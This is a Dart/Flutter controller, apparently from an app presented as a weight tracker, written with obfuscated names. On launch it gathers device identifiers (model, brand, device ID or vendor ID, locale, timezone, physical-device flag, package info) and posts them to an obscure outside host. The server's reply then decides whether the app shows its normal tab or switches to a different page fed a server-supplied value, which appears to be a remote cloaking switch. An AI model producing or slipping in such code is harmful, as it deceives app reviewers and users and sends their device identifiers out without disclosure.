import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reloadPage");
  }
}

class PageLogic extends GetxController {

  var uolzfd = RxBool(false);
  var rnfabwmg = RxBool(true);
  var wzvtknu = RxString("");
  var dale = RxBool(false);
  var morissette = RxBool(true);
  final nslrepywkf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    checkConnect();
    ecotxjzk();
  }


  Future<void> ecotxjzk() async {

    dale.value = true;
    morissette.value = true;
    rnfabwmg.value = false;

    nslrepywkf.post("https://wid.syoquw.art/aeitkcofrmgjnsvdbxwyhupqlz",data: await lundyjwig()).then((value) {
      var hbun = value.data["hbun"] as String;
      var pwdygj = value.data["pwdygj"] as bool;
      if (pwdygj) {
        wzvtknu.value = hbun;
        brendan();
      } else {
        kreiger();
      }
    }).catchError((e) {
      rnfabwmg.value = true;
      morissette.value = true;
      dale.value = false;
    });
  }

  Future<Map<String, dynamic>> lundyjwig() async {
    final DeviceInfoPlugin ugko = DeviceInfoPlugin();
    PackageInfo gzwmnqf_dosuwhvn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var odirmg = Platform.localeName;
    var tqmyoxr = currentTimeZone;

    var zbhxqwfj = gzwmnqf_dosuwhvn.packageName;
    var uahwj = gzwmnqf_dosuwhvn.version;
    var yrsh = gzwmnqf_dosuwhvn.buildNumber;

    var dpxwrobv = gzwmnqf_dosuwhvn.appName;
    var wkfxclzp = "";
    var vwlq  = "";
    var okrfi = "";
    var coltenHessel = "";
    var alexaBednar = "";
    var montyAuer = "";
    var irmaBerge = "";


    var mpqjo = "";
    var amhyw = false;

    if (GetPlatform.isAndroid) {
      mpqjo = "android";
      var ghxvjz = await ugko.androidInfo;

      okrfi = ghxvjz.brand;

      wkfxclzp  = ghxvjz.model;
      vwlq = ghxvjz.id;

      amhyw = ghxvjz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      mpqjo = "ios";
      var bdvzls = await ugko.iosInfo;
      okrfi = bdvzls.name;
      wkfxclzp = bdvzls.model;

      vwlq = bdvzls.identifierForVendor ?? "";
      amhyw  = bdvzls.isPhysicalDevice;
    }
    var res = {
      "dpxwrobv": dpxwrobv,
      "yrsh": yrsh,
      "alexaBednar" : alexaBednar,
      "wkfxclzp": wkfxclzp,
      "tqmyoxr": tqmyoxr,
      "okrfi": okrfi,
      "amhyw": amhyw,
      "vwlq": vwlq,
      "odirmg": odirmg,
      "mpqjo": mpqjo,
      "coltenHessel" : coltenHessel,
      "uahwj": uahwj,
      "montyAuer" : montyAuer,
      "zbhxqwfj": zbhxqwfj,
      "irmaBerge" : irmaBerge,

    };
    return res;
  }

  Future<void> kreiger() async {
    Get.offAllNamed("/weightTab");
  }

  Future<void> brendan() async {
    Get.offAllNamed("/weightFac");
  }

}
